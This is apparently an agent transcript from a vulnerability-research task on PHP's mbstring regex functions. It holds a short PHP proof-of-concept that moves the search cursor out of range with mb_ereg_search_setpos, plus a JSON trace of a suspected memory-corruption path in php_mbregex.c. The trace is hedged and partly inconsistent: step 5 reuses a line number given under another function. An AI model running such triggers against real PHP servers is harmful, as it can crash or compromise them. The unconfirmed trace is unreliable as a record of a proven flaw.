message:
Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_regex_encoding('UTF-8');
mb_ereg_search_init("中国abc + abc ?!？！字符＃　china string", "(?<a>\\w+)");
mb_ereg_search();
mb_ereg_search_getregs();
mb_ereg_search_setpos(999999);
mb_ereg_search_regs();
mb_ereg_search_getregs();
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_str","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker seeds the persistent search subject with a long multibyte string."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"A named-capture pattern is compiled and stored in the global search regex state."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_getregs)","line":1592,"var":"MBREX(search_regs)","code":"n = MBREX(search_regs)->num_regs;","note":"The first getregs call reads the current match region and confirms the search state is initialized."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_setpos)","line":1637,"var":"position","code":"MBREX(search_pos) = position;","note":"The attacker moves the search cursor to an arbitrary position, potentially beyond the current match region."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1592,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... }","note":"A follow-up regs query reuses the shared search_regs/search_str state after the cursor manipulation."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_getregs)","line":1603,"var":"MBREX(search_re)","code":"onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args);","note":"Named-group enumeration consumes the persistent regex and match-region pointers, which is the sink if the cursor/state transition has corrupted the search bookkeeping."}
]
EOF

